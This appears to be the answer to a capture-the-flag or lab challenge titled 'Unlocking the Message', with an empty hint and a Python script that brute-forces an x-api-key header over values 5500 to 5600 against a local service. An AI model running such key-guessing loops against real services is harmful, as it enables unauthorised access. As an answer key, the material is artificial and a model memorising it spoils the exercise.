# 🔑 Unlocking the Message - L04 C04

```
💡 Hint:
```

## Answer

```python
import urllib.request, urllib.parse, urllib.error

for i in range(5500, 5601):
  req = urllib.request.Request("http://127.0.0.1:8082", headers={"x-api-key": str(i)})
  resp = urllib.request.urlopen(req)
  print(resp.read())
```
